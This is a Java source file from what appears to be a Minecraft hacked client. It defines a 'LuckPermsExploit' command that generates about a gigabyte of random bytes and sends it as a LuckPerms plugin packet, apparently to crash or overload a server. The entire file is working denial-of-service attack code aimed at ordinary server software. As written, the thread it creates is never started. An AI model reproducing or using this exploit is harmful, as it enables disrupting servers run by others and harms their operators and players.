package me.nullnet.voxelclient.exploits;

import com.mojang.brigadier.context.CommandContext;
import java.nio.charset.StandardCharsets;
import java.util.Random;
import java.util.concurrent.atomic.AtomicReference;
import me.nullnet.voxelclient.Helper;
import me.nullnet.voxelclient.packets.LuckPermsPayloadPacket;
import me.nullnet.voxelclient.utils.ColorUtil;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.class_2817;

public class LuckPermsExploit {
   public static int execute(CommandContext<FabricClientCommandSource> context) {
      new Thread(() -> {
         long now = System.currentTimeMillis();
         AtomicReference<String> randomJson = new AtomicReference("");
         randomJson.set(generateRandomJson(1000000000));
         LuckPermsPayloadPacket payloadPacket = new LuckPermsPayloadPacket((String)randomJson.get());
         Helper.sendPacket(new class_2817(payloadPacket));
         ((FabricClientCommandSource)context.getSource()).getPlayer().method_7353(ColorUtil.translate("&8[&5&lVoxel&8] &8[&5LuckPermsExploit&8] &7Sent &51 &7exploit packet. &8[&6" + (System.currentTimeMillis() - now) + "ms&8]"), false);
      });
      return 1;
   }

   private static String generateRandomJson(int length) {
      byte[] array = new byte[length];
      (new Random()).nextBytes(array);
      return new String(array, StandardCharsets.UTF_8);
   }
}
